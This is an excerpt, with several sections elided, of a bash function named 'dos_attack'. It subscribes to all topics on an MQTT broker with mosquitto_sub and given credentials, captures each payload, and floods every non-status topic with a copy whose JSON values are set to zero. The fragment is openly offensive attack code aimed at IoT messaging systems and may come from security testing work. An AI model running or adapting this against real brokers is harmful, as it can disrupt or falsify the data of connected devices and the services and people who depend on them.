...
dos_attack() {
    ...
    while read -r topic payload; do
        #echo "Topic inside loop: $topic"
        topic_map["$topic"]=1
        payload_map["$topic"]="$payload"
    done < <(timeout 5 mosquitto_sub -h "$ip" -p "$port" \
         --cafile "$cafile" \
         -u "$username" -P "$password" \
         -t '#' -v) 

# Convert associative array keys into a bash array
    topics=("${!topic_map[@]}")
    ...
    for topic in "${topics[@]}"; do
        if [[ "$topic" == *status ]]; then
            echo "[!] Skipping status topic: $topic"
            continue
        fi

        original_payload="${payload_map[$topic]}"
        
        # Attempt to create a zeroed payload (only if it's valid JSON)
        if echo "$original_payload" | jq empty 2>/dev/null; then
            message=$(echo "$original_payload" | jq 'with_entries(.value = 0)')
        else
            # fallback: just send the original string
        ...
        echo "[+] Flooded topic: $topic with message: $message"
    done
